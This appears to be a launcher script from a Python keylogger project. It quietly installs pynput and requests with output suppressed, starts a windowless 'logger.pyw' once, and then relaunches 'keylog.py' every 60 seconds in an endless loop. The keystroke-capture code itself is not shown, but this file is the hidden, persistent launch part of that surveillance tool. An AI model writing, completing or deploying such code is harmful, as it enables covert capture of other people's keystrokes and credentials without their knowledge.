import subprocess
import sys
import time
import importlib

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

def check_and_install_libraries():
    libraries = ["pynput", "requests"]
    for lib in libraries:
        try:
            importlib.import_module(lib)
        except ImportError:
            install(lib)

def run_once(file_name):
    subprocess.Popen([sys.executable, file_name])

def run_in_cycle(file_name, interval):
    while True:
        subprocess.Popen([sys.executable, file_name])
        time.sleep(interval)

def main():
    check_and_install_libraries()
    
    # Run the first file once
    run_once("programs/logger.pyw")  # Replace with the first Python file name

    # Run the second file in a cycle
    run_in_cycle("programs/keylog.py", 60)  # Replace with the second Python file name and interval in seconds (600 seconds = 10 minutes)

if __name__ == "__main__":
    main()

